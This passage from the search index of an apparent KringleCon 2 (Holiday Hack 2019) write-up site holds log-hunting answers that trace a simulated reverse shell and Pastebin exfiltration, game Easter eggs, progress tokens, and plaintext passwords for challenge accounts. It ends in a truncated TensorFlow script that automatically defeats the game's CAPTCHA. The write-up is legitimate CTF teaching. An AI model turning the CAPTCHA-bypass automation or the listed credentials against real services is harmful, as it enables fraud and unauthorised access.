5"},{"location":"hints/h9/#question-6","text":"\"The attacker pivoted to another workstation using credentials gained from Minty's computer. Which account name was used to pivot to another machine?\" Back to network events we go and more specifically logon events originating from the attacker machine. We know the reverse shell connection went back to IP 192.168.247.175 . If we combine this information with Windows event ID 4624 , which tracks successful login activity, and exclude Minty's workstation we should be able to find the other host and the account name used to log in there. EventID:4624 AND SourceNetworkAddress:192.168.247.175 AND NOT DestinationHostname:elfu-res-wks1 Answer : alabaster","title":"Question 6"},{"location":"hints/h9/#question-7","text":"\"What is the time (HH:MM:SS) the attacker makes a Remote Desktop connection to another machine?\" Windows event ID 4624 tracks a number of different logon types like local interactive (i.e. logon type 2) and connections to shared folders across the network (i.e. logon type 3). It also tracks remote interactive login activity like Remote Desktop via logon type 10 . EventID:4624 AND LogonType:10 Answer : 06:04:28","title":"Question 7"},{"location":"hints/h9/#question-8","text":"\"The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection? (submit in that order as csv)\" At this point we can start limiting our searches to activity that happened since the previously found events. We're still searching for logon activity using Windows event ID 4624 but this time we're looking for connections to shared folders or logon type 3 . timestamp:[\"2019-11-19 06:04:28.000\" TO *] AND EventID:4624 AND LogonType:3 Answer : ELFU-RES-WKS2,elfu-res-wks3,3","title":"Question 8"},{"location":"hints/h9/#question-9","text":"\"What is the full-path + filename of the secret research document after being transferred from the third host to the second host?\" Just like the Firefox download from question 1, copying a file means writing it to disk and thus generating a file creation time event (i.e. Sysmon event ID 2 ). Add the source name for the second host, limit the results to activity that happened since the Remote Desktop login, and filter out any file names ending in .temp or .xml to find the research document. EventID:2 AND source:elfu-res-wks2 AND timestamp:[\"2019-11-19 06:04:28.000\" TO *] AND NOT TargetFilename:/.*(.temp|.xml)/ Answer : C:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf","title":"Question 9"},{"location":"hints/h9/#question-10","text":"\"What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?\" First we need to understand how the data was exfiltrated (i.e. what commands were used) before we can answer the question where it was exfiltrated to. Begin by searching for just filename of the exfiltrated document, super_secret_elfu_research.pdf . super_secret_elfu_research.pdf It appears our attacker used PowerShell to upload the file to Pastebin. Now that we know how the data was exfiltrated we can search for Sysmon event ID 3 (i.e. a network connection) and the pastebin.com domain to retrieve the associated destination IP address. EventID:3 AND DestinationHostname:pastebin.com Answer : 104.22.3.84","title":"Question 10"},{"location":"hints/h9/#answer","text":"C:\\Users\\minty\\Downloads\\cookie_recipe.exe 192.168.247.175:4444 whoami webexservice C:\\cookie.exe alabaster 06:04:28 ELFU-RES-WKS2,elfu-res-wks3,3 C:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf 104.22.3.84","title":"Answer"},{"location":"hints/h9/#hint","text":"That's it - hooray! Have you had any luck retrieving scraps of paper from the Elf U server? You might want to look into SQL injection techniques. OWASP is always a good resource for web attacks. For blind SQLi, I've heard Sqlmap is a great tool. In certain circumstances though, you need custom tamper scripts to get things going!","title":"Hint"},{"location":"misc/interesting_ui/","text":"Interesting UI Elements # Epic Beard Craze # I'm not quite sure if it's because of the stress from all these KringleCon events or if there's some weird hipster craze hitting the North Pole, but some of these elves have gone through quite the transformation in the past year. Pretty epic facial hair, Bushy. Unused Elves # After searching for the avatar for Krampus as part of challenge 7 I went back and looked at the rest of the elf avatars as some of the avatar images had a filename that matched the name of the elf (e.g. mintycandycane.png , kent.png ) while others used a more generic elfX.png file naming convention. Minty Candycane is also the only elf whose avatar looks the same as last year. elf15.png , the 6th elf from the left in the image below, is used as a generic image which is then replaced with the correct NPC's avatar. Probably a remnant from the development stages to ensure all NPCs showed up on screen, even if it was with a default image (this includes Santa himself). Worth noting is that not only do some of the Elf characters in the game use a generic elfX.png filename, there's also more elf avatar images available than are used in the game. Unused elves, from left to right: elf5.png , elf6.png , elf10.png , elf11.png , elf14.png , elf15.png (default NPC avatar), elf17.png , elf18.png , elf19.png , elf20.png , elf21.png , and elf22.png . In some cases the CSS also references the generic PNG files with an actual Elf name, even when the Elf doesn't make an appearance in the game. This is the case for both elf10.png aka Morcel Nougat and elf11.png aka Elinor Twinkletoes, two characters from last year's KringleCon event who seem to have hitched a ride in this year's CSS file. .viewport .ent.npc.npc-morcelnougat .npc-avatar { background-image: url(/images/avatars/elves/elf10.png); } .viewport .ent.npc.npc-elinoretwinkletoes .npc-avatar { background-image: url(/images/avatars/elves/elf11.png); } Toy & Elf Soldiers # Another group of avatars that tagged along from the previous event are toy and elf soldiers, 6 color variants for each set. I guess Santa must've thought it would be good to have a handful of muscle at the ready just in case. Luckily it wasn't needed this time around and we were able to apprehend the Tooth Fairy without a show of force. Toy Soldiers CSS: .viewport .ent.npc.npc-toysoldier1 .npc-avatar { background-image: url(/images/avatars/soldiers/kc18_soldiers_blue_2.png); } .viewport .ent.npc.npc-toysoldier2 .npc-avatar { background-image: url(/images/avatars/soldiers/kc18_soldiers_green_3.png); } .viewport .ent.npc.npc-sysoldier3 .npc-avatar { background-image: url(/images/avatars/soldiers/kc18_soldiers_orange_2.png); } .viewport .ent.npc.npc-toysoldier4 .npc-avatar { background-image: url(/images/avatars/soldiers/kc18_soldiers_pink_1.png); } .viewport .ent.npc.npc-toysoldier5 .npc-avatar { background-image: url(/images/avatars/soldiers/kc18_soldiers_red_2.png); } .viewport .ent.npc.npc-toysoldier6 .npc-avatar { background-image: url(/images/avatars/soldiers/kc18_soldiers_red_3.png); } Elf Soldiers CSS: .viewport .ent.npc.npc-elfsoldier1 .npc-avatar { background-image: url(/images/avatars/reveal/kc18_soldiers2_blue_2.png); } .viewport .ent.npc.npc-elfsoldier2 .npc-avatar { background-image: url(/images/avatars/reveal/kc18_soldiers2_green_3.png); } .viewport .ent.npc.npc-elfsoldier3 .npc-avatar { background-image: url(/images/avatars/reveal/kc18_soldiers2_orange_2.png); } .viewport .ent.npc.npc-elfsoldier4 .npc-avatar { background-image: url(/images/avatars/reveal/kc18_soldiers2_pink_1.png); } .viewport .ent.npc.npc-elfsoldier5 .npc-avatar { background-image: url(/images/avatars/reveal/kc18_soldiers2_red_2.png); } .viewport .ent.npc.npc-elfsoldier6 .npc-avatar { background-image: url(/images/avatars/reveal/kc18_soldiers2_red_3.png); } Netwars Krampus # The CSS also references a version of Krampus which, based on the .npc-krampus-netwars class name used, should appear in the Netwars room. Either I didn't trigger the right series of events while playing the game or this code wasn't actually used. .npc-krampus-steamtunnel , .npc-krampus-sleighroom and .npc-krampus-lastroom refer to the different instances of Krampus you talk to, except for the version of Krampus that appears to scamper away in Minty's dorm room, which uses a different type of CSS styling. As with the other CSS classes, it uses the same high-res Krampus avatar background image and the only difference is the location string in the class name. .viewport .ent.npc.npc-krampus-netwars .npc-avatar { width: 100px; height: 188px; background: url(/images/avatars/elves/krampus.png) no-repeat; background-size: auto 200px; background-position: 6px 3px; } Dorm Access Code # Not quite sure why Tangle Coalbox was having issues with the keypad code in the Frosty Keypad challenge as he could've probably just peered through the windows and see that the actual code, 7331 , is written on the left side of the dorm wall. Looks like we also have some Doctor Who fans at Elf University judging by the TARDIS drawn around the second door from the left. Lucky Elf # The second Elf from the right at the bottom right table in the Netwars room looks like a real winner. If you download the laptop image you'll see that one of the laptop screens is displaying a golden ticket and while other laptops are duplicated across some of the Netwars participants in the room, the laptop with the golden ticket is used only once. Congratulations mystery Elf! Bag of Teeth, Literally # If you're like me and thought that white pile in the top right corner of the Elf Univesity Bell Tower was just a heap of snow then you might be unpleasantly surprised. It's actually, as the file name for the image texture puts it, quite-literally-a-huge-pile-of-teeth . Say what you want about the Tooth Fairy, but that is one pretty impressive dental haul right there. Jack Frost & KringleCon 3 # The final entry of the narrative, the .narrativeCliffHanger CSS class for the final narrative entry, as well as the final note you find in the top left corner of the Elf University Bell Tower all hint at what might be in store for next year's KringleCon event. Jack Frost was apparently helping the Tooth Fairy. Ho-ho-ho-holy cliffhanger, Batman! This Christmas must now fall asleep, But next year comes, and troubles creep. And Jack Frost hasn't made a peep, And Jack Frost hasn't made a peep...","title":"Interesting UI Elements"},{"location":"misc/interesting_ui/#interesting-ui-elements","text":"","title":"Interesting UI Elements"},{"location":"misc/interesting_ui/#epic-beard-craze","text":"I'm not quite sure if it's because of the stress from all these KringleCon events or if there's some weird hipster craze hitting the North Pole, but some of these elves have gone through quite the transformation in the past year. Pretty epic facial hair, Bushy.","title":"Epic Beard Craze"},{"location":"misc/interesting_ui/#unused-elves","text":"After searching for the avatar for Krampus as part of challenge 7 I went back and looked at the rest of the elf avatars as some of the avatar images had a filename that matched the name of the elf (e.g. mintycandycane.png , kent.png ) while others used a more generic elfX.png file naming convention. Minty Candycane is also the only elf whose avatar looks the same as last year. elf15.png , the 6th elf from the left in the image below, is used as a generic image which is then replaced with the correct NPC's avatar. Probably a remnant from the development stages to ensure all NPCs showed up on screen, even if it was with a default image (this includes Santa himself). Worth noting is that not only do some of the Elf characters in the game use a generic elfX.png filename, there's also more elf avatar images available than are used in the game. Unused elves, from left to right: elf5.png , elf6.png , elf10.png , elf11.png , elf14.png , elf15.png (default NPC avatar), elf17.png , elf18.png , elf19.png , elf20.png , elf21.png , and elf22.png . In some cases the CSS also references the generic PNG files with an actual Elf name, even when the Elf doesn't make an appearance in the game. This is the case for both elf10.png aka Morcel Nougat and elf11.png aka Elinor Twinkletoes, two characters from last year's KringleCon event who seem to have hitched a ride in this year's CSS file. .viewport .ent.npc.npc-morcelnougat .npc-avatar { background-image: url(/images/avatars/elves/elf10.png); } .viewport .ent.npc.npc-elinoretwinkletoes .npc-avatar { background-image: url(/images/avatars/elves/elf11.png); }","title":"Unused Elves"},{"location":"misc/interesting_ui/#toy-elf-soldiers","text":"Another group of avatars that tagged along from the previous event are toy and elf soldiers, 6 color variants for each set. I guess Santa must've thought it would be good to have a handful of muscle at the ready just in case. Luckily it wasn't needed this time around and we were able to apprehend the Tooth Fairy without a show of force. Toy Soldiers CSS: .viewport .ent.npc.npc-toysoldier1 .npc-avatar { background-image: url(/images/avatars/soldiers/kc18_soldiers_blue_2.png); } .viewport .ent.npc.npc-toysoldier2 .npc-avatar { background-image: url(/images/avatars/soldiers/kc18_soldiers_green_3.png); } .viewport .ent.npc.npc-sysoldier3 .npc-avatar { background-image: url(/images/avatars/soldiers/kc18_soldiers_orange_2.png); } .viewport .ent.npc.npc-toysoldier4 .npc-avatar { background-image: url(/images/avatars/soldiers/kc18_soldiers_pink_1.png); } .viewport .ent.npc.npc-toysoldier5 .npc-avatar { background-image: url(/images/avatars/soldiers/kc18_soldiers_red_2.png); } .viewport .ent.npc.npc-toysoldier6 .npc-avatar { background-image: url(/images/avatars/soldiers/kc18_soldiers_red_3.png); } Elf Soldiers CSS: .viewport .ent.npc.npc-elfsoldier1 .npc-avatar { background-image: url(/images/avatars/reveal/kc18_soldiers2_blue_2.png); } .viewport .ent.npc.npc-elfsoldier2 .npc-avatar { background-image: url(/images/avatars/reveal/kc18_soldiers2_green_3.png); } .viewport .ent.npc.npc-elfsoldier3 .npc-avatar { background-image: url(/images/avatars/reveal/kc18_soldiers2_orange_2.png); } .viewport .ent.npc.npc-elfsoldier4 .npc-avatar { background-image: url(/images/avatars/reveal/kc18_soldiers2_pink_1.png); } .viewport .ent.npc.npc-elfsoldier5 .npc-avatar { background-image: url(/images/avatars/reveal/kc18_soldiers2_red_2.png); } .viewport .ent.npc.npc-elfsoldier6 .npc-avatar { background-image: url(/images/avatars/reveal/kc18_soldiers2_red_3.png); }","title":"Toy &amp; Elf Soldiers"},{"location":"misc/interesting_ui/#netwars-krampus","text":"The CSS also references a version of Krampus which, based on the .npc-krampus-netwars class name used, should appear in the Netwars room. Either I didn't trigger the right series of events while playing the game or this code wasn't actually used. .npc-krampus-steamtunnel , .npc-krampus-sleighroom and .npc-krampus-lastroom refer to the different instances of Krampus you talk to, except for the version of Krampus that appears to scamper away in Minty's dorm room, which uses a different type of CSS styling. As with the other CSS classes, it uses the same high-res Krampus avatar background image and the only difference is the location string in the class name. .viewport .ent.npc.npc-krampus-netwars .npc-avatar { width: 100px; height: 188px; background: url(/images/avatars/elves/krampus.png) no-repeat; background-size: auto 200px; background-position: 6px 3px; }","title":"Netwars Krampus"},{"location":"misc/interesting_ui/#dorm-access-code","text":"Not quite sure why Tangle Coalbox was having issues with the keypad code in the Frosty Keypad challenge as he could've probably just peered through the windows and see that the actual code, 7331 , is written on the left side of the dorm wall. Looks like we also have some Doctor Who fans at Elf University judging by the TARDIS drawn around the second door from the left.","title":"Dorm Access Code"},{"location":"misc/interesting_ui/#lucky-elf","text":"The second Elf from the right at the bottom right table in the Netwars room looks like a real winner. If you download the laptop image you'll see that one of the laptop screens is displaying a golden ticket and while other laptops are duplicated across some of the Netwars participants in the room, the laptop with the golden ticket is used only once. Congratulations mystery Elf!","title":"Lucky Elf"},{"location":"misc/interesting_ui/#bag-of-teeth-literally","text":"If you're like me and thought that white pile in the top right corner of the Elf Univesity Bell Tower was just a heap of snow then you might be unpleasantly surprised. It's actually, as the file name for the image texture puts it, quite-literally-a-huge-pile-of-teeth . Say what you want about the Tooth Fairy, but that is one pretty impressive dental haul right there.","title":"Bag of Teeth, Literally"},{"location":"misc/interesting_ui/#jack-frost-kringlecon-3","text":"The final entry of the narrative, the .narrativeCliffHanger CSS class for the final narrative entry, as well as the final note you find in the top left corner of the Elf University Bell Tower all hint at what might be in store for next year's KringleCon event. Jack Frost was apparently helping the Tooth Fairy. Ho-ho-ho-holy cliffhanger, Batman! This Christmas must now fall asleep, But next year comes, and troubles creep. And Jack Frost hasn't made a peep, And Jack Frost hasn't made a peep...","title":"Jack Frost &amp; KringleCon 3"},{"location":"misc/progress_tokens/","text":"Progress Tokens # As you progress through the game and solve challenges, additional token classes will be added to the hhc-game-elements div. Tokens can be grouped under different categories like areas visited, hints given, narrative sections given, objectives given, initial chat conversations, completed chat conversations, attempted challenges, completed challeges, booth conversations, end credits, and miscellaneous events like receiving the badge upgrade. The token information is probably what triggers the notifications that pop up as you progress throughout the game. Below is an overview of all tokens I was able to collect and, while I completed all main objectives and hint challenges, it appears I still might have missed a few of them. For example, even after solving challenge 12 , Krampus keeps repeating the same line \"But there\u2019s still time! Solve the final challenge in your badge by blocking the bad IPs at srf.elfu.org and save the holiday season!\" . This appears to be confirmed by the hhtTotals const in the con.js script. Totals for narrative , objective , and area match up with the number of tokens collected, but hints is off by one. Looks like I might be missing token-give-hint-rita2 . const hhcTotals = { \"hint\": 32, \"achievement\": 25, \"objective\": 13, \"narrative\": 10, \"info\": 2, \"areas\": 20, \"collectibles\": 0, \"talks\": 15 }; Areas Visited # token-trainstation_visited token-quad_visited token-hermeyhall_visited token-netwars_visited token-library_visited token-speakerroom_visited token-dorm_visited token-mintydorm_visited token-mintycloset_visited token-steamtunnels_visited token-studentunion_visited token-sleighshop_visited token-track1_visited token-track2_visited token-track3_visited token-track4_visited token-track5_visited token-track6_visited token-track7_visited token-finale_visited Hints # token-give-hint-edBasics token-give-hint-bitting1 token-give-hint-bitting2 token-give-hint-trail token-give-hint-deepbluecli1 token-give-hint-deepbluecli2 token-give-hint-iptables token-give-hint-mongo token-give-hint-keypad token-give-hint-sqlmap1 token-give-hint-sqlmap2 token-give-hint-eql token-give-hint-graylog1 token-give-hint-graylog2 token-give-hint-consolehack1 token-give-hint-consolehack2 token-give-hint-consolehack3 token-give-hint-consolehack4 token-give-hint-consolehack5 token-give-hint-consolehack6 token-give-hint-elfscrow1 token-give-hint-sysmon token-give-hint-jq token-give-hint-path token-give-hint-flightroute1 token-give-hint-flightroute2 token-give-hint-powershell token-give-hint-capteha1 token-give-hint-rita1 token-give-hint-nyanshell1 token-give-hint-nyanshell2 Narrative # token-giveNarrative_MeetSanta token-giveNarrative_narrativeCapteha token-giveNarrative_narrativeDovesFound token-giveNarrative_narrativeTFPlotReveal token-giveNarrative_narrativeMeetKrampus Give Objective # token-give-obj-splunk token-give-obj-bitting token-give-obj-keybitting token-give-obj-elfscrow token-give-obj-deepbluecli token-give-obj-capteha token-give-obj-turtledoves token-give-obj-flightroute token-give-obj-consolehack token-give-obj-redactedpdf token-give-obj-sqlmap token-give-obj-eql token-give-obj-rita Initial # token-alabastersnowball^^^initial token-shinnyupatree^^^initial token-wunorseopenslae^^^initial token-pepperminstix^^^initial token-kenttinseltooth^^^initial token-krampus-steamtunnel^^^initial token-santa-lastroom^^^initial token-turtledoves^^^initial token-sugarplummary^^^initial token-mintycandycane^^^initial token-santa-quad^^^initial token-bushyevergreen^^^initial token-profbanas^^^initial token-hollyevergreen^^^initial token-toothfairy-lastroom^^^initial token-krampus-lastroom^^^initial token-krampus-sleighroom^^^initial token-santa-trainstation^^^initial token-tanglecoalbox^^^initial token-toothfairy-sleighroom^^^initial token-sparkleredberry^^^initial Attempted # token-bitting-cutter_attempted token-bitting-keyhole_attempted token-iptables_attempted token-graylog_attempted token-nyanshell_attempted token-keypad_attempted token-trail_attempted token-edescape_attempted token-fridosleigh_attempted token-jq_attempted token-powershell_attempted token-path_attempted token-mongo_attempted token-sleighroutefinder_attempted Completed # token-edescape_completed token-path_completed token-powershell_completed token-keypad_completed token-trail_completed token-nyanshell_completed token-graylog_completed token-mongo_completed token-iptables_completed token-jq_completed token-turtledoves_completed token-redacted_completed token-deepbluecli_completed token-eql_completed token-rita_completed token-splunk_completed token-bitting_completed token-bitting-keyhole_completed token-capteha_completed token-sqlmap_completed token-elfscrow_completed token-consolehack_completed token-flightroute_completed token-hhc19_completed Initial Chat # token-initial-chat-kenttinseltooth token-initial-chat-wunorseopenslae token-initial-chat-sparkleredberry token-initial-chat-profbanas token-initial-chat-santa-trainstation token-initial-chat-bushyevergreen token-initial-chat-sugarplummary token-initial-chat-pepperminstix token-initial-chat-santa-quad token-initial-chat-tanglecoalbox token-initial-chat-mintycandycane token-initial-chat-alabastersnowball token-initial-chat-hollyevergreen Chat Complete # token-kenttinseltooth^^^chat-iptables_complete token-wunorseopenslae^^^chat-jq_complete token-sparkleredberry^^^chat-powershell_complete token-profbanas^^^chat-splunk_completed token-bushyevergreen^^^chat-edescape_completed token-sugarplummary^^^chat-path_complete token-pepperminstix^^^chat-graylog_complete token-tanglecoalbox^^^chat-keypad_completed token-mintycandycane^^^chat-trail_complete token-alabastersnowball^^^chat-nyanshell_complete token-hollyevergreen^^^chat-mongo_complete token-shinnyupatree^^^chat-consolehack-completed Booths Initial # token-googlebooth^^^initial token-splunkbooth^^^initial token-stibooth^^^initial token-swagbooth^^^initial Booths Talked # token-talked-to-googlebooth token-talked-to-splunkbooth token-talked-to-stibooth token-talked-to-swagbooth Credits # token-rollCredits1 token-rollCredits2 token-rollCredits3 Other # token-turtledoves token-talktosanta token-santa-quad^^^phaseTwo token-shinnyupatree^^^chat-post-teleport token-give-achievement-teleport token-krampus-steamtunnel^^^token-completechal7 token-krampus-steamtunnel^^^token-completechal8","title":"Progress Tokens"},{"location":"misc/progress_tokens/#progress-tokens","text":"As you progress through the game and solve challenges, additional token classes will be added to the hhc-game-elements div. Tokens can be grouped under different categories like areas visited, hints given, narrative sections given, objectives given, initial chat conversations, completed chat conversations, attempted challenges, completed challeges, booth conversations, end credits, and miscellaneous events like receiving the badge upgrade. The token information is probably what triggers the notifications that pop up as you progress throughout the game. Below is an overview of all tokens I was able to collect and, while I completed all main objectives and hint challenges, it appears I still might have missed a few of them. For example, even after solving challenge 12 , Krampus keeps repeating the same line \"But there\u2019s still time! Solve the final challenge in your badge by blocking the bad IPs at srf.elfu.org and save the holiday season!\" . This appears to be confirmed by the hhtTotals const in the con.js script. Totals for narrative , objective , and area match up with the number of tokens collected, but hints is off by one. Looks like I might be missing token-give-hint-rita2 . const hhcTotals = { \"hint\": 32, \"achievement\": 25, \"objective\": 13, \"narrative\": 10, \"info\": 2, \"areas\": 20, \"collectibles\": 0, \"talks\": 15 };","title":"Progress Tokens"},{"location":"misc/progress_tokens/#areas-visited","text":"token-trainstation_visited token-quad_visited token-hermeyhall_visited token-netwars_visited token-library_visited token-speakerroom_visited token-dorm_visited token-mintydorm_visited token-mintycloset_visited token-steamtunnels_visited token-studentunion_visited token-sleighshop_visited token-track1_visited token-track2_visited token-track3_visited token-track4_visited token-track5_visited token-track6_visited token-track7_visited token-finale_visited","title":"Areas Visited"},{"location":"misc/progress_tokens/#hints","text":"token-give-hint-edBasics token-give-hint-bitting1 token-give-hint-bitting2 token-give-hint-trail token-give-hint-deepbluecli1 token-give-hint-deepbluecli2 token-give-hint-iptables token-give-hint-mongo token-give-hint-keypad token-give-hint-sqlmap1 token-give-hint-sqlmap2 token-give-hint-eql token-give-hint-graylog1 token-give-hint-graylog2 token-give-hint-consolehack1 token-give-hint-consolehack2 token-give-hint-consolehack3 token-give-hint-consolehack4 token-give-hint-consolehack5 token-give-hint-consolehack6 token-give-hint-elfscrow1 token-give-hint-sysmon token-give-hint-jq token-give-hint-path token-give-hint-flightroute1 token-give-hint-flightroute2 token-give-hint-powershell token-give-hint-capteha1 token-give-hint-rita1 token-give-hint-nyanshell1 token-give-hint-nyanshell2","title":"Hints"},{"location":"misc/progress_tokens/#narrative","text":"token-giveNarrative_MeetSanta token-giveNarrative_narrativeCapteha token-giveNarrative_narrativeDovesFound token-giveNarrative_narrativeTFPlotReveal token-giveNarrative_narrativeMeetKrampus","title":"Narrative"},{"location":"misc/progress_tokens/#give-objective","text":"token-give-obj-splunk token-give-obj-bitting token-give-obj-keybitting token-give-obj-elfscrow token-give-obj-deepbluecli token-give-obj-capteha token-give-obj-turtledoves token-give-obj-flightroute token-give-obj-consolehack token-give-obj-redactedpdf token-give-obj-sqlmap token-give-obj-eql token-give-obj-rita","title":"Give Objective"},{"location":"misc/progress_tokens/#initial","text":"token-alabastersnowball^^^initial token-shinnyupatree^^^initial token-wunorseopenslae^^^initial token-pepperminstix^^^initial token-kenttinseltooth^^^initial token-krampus-steamtunnel^^^initial token-santa-lastroom^^^initial token-turtledoves^^^initial token-sugarplummary^^^initial token-mintycandycane^^^initial token-santa-quad^^^initial token-bushyevergreen^^^initial token-profbanas^^^initial token-hollyevergreen^^^initial token-toothfairy-lastroom^^^initial token-krampus-lastroom^^^initial token-krampus-sleighroom^^^initial token-santa-trainstation^^^initial token-tanglecoalbox^^^initial token-toothfairy-sleighroom^^^initial token-sparkleredberry^^^initial","title":"Initial"},{"location":"misc/progress_tokens/#attempted","text":"token-bitting-cutter_attempted token-bitting-keyhole_attempted token-iptables_attempted token-graylog_attempted token-nyanshell_attempted token-keypad_attempted token-trail_attempted token-edescape_attempted token-fridosleigh_attempted token-jq_attempted token-powershell_attempted token-path_attempted token-mongo_attempted token-sleighroutefinder_attempted","title":"Attempted"},{"location":"misc/progress_tokens/#completed","text":"token-edescape_completed token-path_completed token-powershell_completed token-keypad_completed token-trail_completed token-nyanshell_completed token-graylog_completed token-mongo_completed token-iptables_completed token-jq_completed token-turtledoves_completed token-redacted_completed token-deepbluecli_completed token-eql_completed token-rita_completed token-splunk_completed token-bitting_completed token-bitting-keyhole_completed token-capteha_completed token-sqlmap_completed token-elfscrow_completed token-consolehack_completed token-flightroute_completed token-hhc19_completed","title":"Completed"},{"location":"misc/progress_tokens/#initial-chat","text":"token-initial-chat-kenttinseltooth token-initial-chat-wunorseopenslae token-initial-chat-sparkleredberry token-initial-chat-profbanas token-initial-chat-santa-trainstation token-initial-chat-bushyevergreen token-initial-chat-sugarplummary token-initial-chat-pepperminstix token-initial-chat-santa-quad token-initial-chat-tanglecoalbox token-initial-chat-mintycandycane token-initial-chat-alabastersnowball token-initial-chat-hollyevergreen","title":"Initial Chat"},{"location":"misc/progress_tokens/#chat-complete","text":"token-kenttinseltooth^^^chat-iptables_complete token-wunorseopenslae^^^chat-jq_complete token-sparkleredberry^^^chat-powershell_complete token-profbanas^^^chat-splunk_completed token-bushyevergreen^^^chat-edescape_completed token-sugarplummary^^^chat-path_complete token-pepperminstix^^^chat-graylog_complete token-tanglecoalbox^^^chat-keypad_completed token-mintycandycane^^^chat-trail_complete token-alabastersnowball^^^chat-nyanshell_complete token-hollyevergreen^^^chat-mongo_complete token-shinnyupatree^^^chat-consolehack-completed","title":"Chat Complete"},{"location":"misc/progress_tokens/#booths-initial","text":"token-googlebooth^^^initial token-splunkbooth^^^initial token-stibooth^^^initial token-swagbooth^^^initial","title":"Booths Initial"},{"location":"misc/progress_tokens/#booths-talked","text":"token-talked-to-googlebooth token-talked-to-splunkbooth token-talked-to-stibooth token-talked-to-swagbooth","title":"Booths Talked"},{"location":"misc/progress_tokens/#credits","text":"token-rollCredits1 token-rollCredits2 token-rollCredits3","title":"Credits"},{"location":"misc/progress_tokens/#other","text":"token-turtledoves token-talktosanta token-santa-quad^^^phaseTwo token-shinnyupatree^^^chat-post-teleport token-give-achievement-teleport token-krampus-steamtunnel^^^token-completechal7 token-krampus-steamtunnel^^^token-completechal8","title":"Other"},{"location":"misc/user_accounts/","text":"User Accounts # Nyanshell # URL : https://docker2019.kringlecon.com/?challenge=nyanshell Username : alabaster_snowball Password : Password2 Splunk # URL : https://splunk.elfu.org Username : elf Password : elfsocks Graylog # URL : https://graylog.elfu.org Username : elfustudent Password : elfustudent Sleigh Route Finder # URL : https://srf.elfu.org Username : admin Password : 924158F9522B3744F5FCD4D10FAC4356","title":"User Accounts"},{"location":"misc/user_accounts/#user-accounts","text":"","title":"User Accounts"},{"location":"misc/user_accounts/#nyanshell","text":"URL : https://docker2019.kringlecon.com/?challenge=nyanshell Username : alabaster_snowball Password : Password2","title":"Nyanshell"},{"location":"misc/user_accounts/#splunk","text":"URL : https://splunk.elfu.org Username : elf Password : elfsocks","title":"Splunk"},{"location":"misc/user_accounts/#graylog","text":"URL : https://graylog.elfu.org Username : elfustudent Password : elfustudent","title":"Graylog"},{"location":"misc/user_accounts/#sleigh-route-finder","text":"URL : https://srf.elfu.org Username : admin Password : 924158F9522B3744F5FCD4D10FAC4356","title":"Sleigh Route Finder"},{"location":"scripts/capteha_api.py/","text":"capteha_api.py # Purpose : bypass the CAPTHEHA in the Bypassing the Frido Sleigh CAPTEHA challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Bypassing the Frido Sleigh CAPTEHA Challenge.\"\"\" # Image Recognition Using Tensorflow Exmaple. # Code based on example at: # https://raw.githubusercontent.com/tensorflow/tensorflow/master/tensorflow/examples/label_image/label_image.py import os import base64 os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3' import tensorflow as tf # noqa tf.logging.set_verbosity(tf.logging.ERROR) import numpy as np # noqa import threading # noqa import queue # noqa import time # noqa import requests # noqa import sys # noqa import json # noqa # sudo apt install python3-pip # sudo python3 -m pip install --upgrade pip # sudo python3 -m pip install --upgrade setuptools # sudo python3 -m pip install --upgrade tensorflow==1.15 def load_labels(label_file): \"\"\"Load labels.\"\"\" label = [] proto_as_ascii_lines = tf.gfile.GFile(label_file).readlines() for l in proto_as_ascii_lines: label.append(l.rstrip()) return label def predict_image( q, sess, graph, image_bytes, img_uuid, labels, input_operation, output_operation): \"\"\"Predict image.\"\"\" image = read_tensor_from_image_bytes(image_bytes) results = sess.run(output_operation.outputs[0], { input_operation.outputs[0]: image }) results = np.squeeze(results) prediction = results.argsort()[-5:][::-1][0] q.put({ 'img_uuid': img_uuid, 'prediction': labels[prediction].title(), 'percent': results[prediction] }) def load_graph(model_file): \"\"\"Load graph.\"\"\" graph = tf.Graph() graph_def = tf.GraphDef() with open(model_file, \"rb\") as f: graph_def.ParseFromString(f.read()) with graph.as_default(): tf.import_graph_def(graph_def) return graph def read_tensor_from_image_bytes( imagebytes, input_height=128, input_width=128, input_mean=0, input_std=255): \"\"\"Read Tensor from image bytes.\"\"\" image_reader = tf.image.decode_png( imagebytes, channels=3, name=\"png_reader\" ) float_caster = tf.cast(image_reader, tf.float32) dims_expander = tf.expand_dims(float_caster, 0) resized = tf.image.resize_bilinear( dims_expander, [input_height, input_width] ) normalized = tf.divide(tf.subtract(resized, [input_mean]), [input_std]) sess = tf.compat.v1.Session() result = sess.run(normalized) return result def main(): \"\"\"Execute.\"\"\" # Loading the Trained Machine Learning Model created from # running retrain.py on the training_images directory graph = load_graph('./tmp/retrain_tmp/output_graph.pb') labels = load_labels(\"./tmp/retrain_tmp/output_labels.txt\") # Load up our session input_operation = graph.get_operation_by_name(\"import/Placeholder\") output_operation = graph.get_operation_by_name(\"import/final_result\") sess = tf.compat.v1.Session(graph=graph) url = \"https://fridosleigh.com/\" # Create session s = requests.Session() # Get CAPTEHA images and types r = s.post(f'{url}api/capteha/request') if (r.json()['request']): images = r.json()['images'] types = [x.strip() for x in r.json()['select_type'].split(',')] types[-1] = types[-1].replace('and ', '') # Can use queues and threading to spead up the processing q = queue.Queue() # Going to iterate over each of our images. for image in images: img_uuid = image['uuid'] img_base64 = image['base64'] print('Processing Image {}'.format(img_uuid)) # We don't want to process too many images at once. 10 threads max while len(threading.enumerate()) > 10: time.sleep(0.0001) # Predict_image function is expecting png image bytes so we read # image as 'rb' to get a bytes object image_bytes = base64.b64decode(img_base64) threading.Thread( target=predict_image, args=( q, sess, graph, image_bytes, img_uuid, labels, input_operation, output_operation ) ).start() print('Waiting For Threads to Finish...') while q.qsize() < len(images): time.sleep(0.001) # Getting a list of all threads returned results prediction_results = [q.get() for x in range(q.qsize())] answers = [] # What are we looking for? print(f'Looking for {types}') # Get the matching images for prediction in prediction_results: if prediction['prediction'] in types: print(f\"{prediction['img_uuid']} is a {prediction['prediction']}.\") answers.append(prediction['img_uuid']) final_answer = ','.join(answers) # Submit CAPTHEHA answers json_resp = json.loads( s.post( f'{url}api/capteha/submit', data={'answer': final_answer} ).text ) # WOMP WOMP if not json_resp['request']: # If it fails just run again. ML might get one wrong occasionally print('FAILED MACHINE LEARNING GUESS') 